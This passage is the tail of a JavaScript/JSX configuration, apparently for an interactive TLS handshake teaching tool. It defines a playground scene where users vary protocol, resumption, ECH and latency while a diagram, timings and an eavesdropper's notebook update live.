        cfg: { scene: 'shake', shake: { proto: 'tls13', resume: 'full', tcp: true, rtt: 80 } },
        body: (
          <p>
            Mix and match the protocol, resumption, ECH and network latency. The diagram, the timings and Eve’s notebook update live. Then try the
            challenges.
          </p>
        ),
        card: (sim) => <Playground sim={sim} initialRtt={80} />,
        legend: [L.tcp, L.clear, L.enc, L.early],
        hud: ['rtt'],
      },
    ],
  },
];
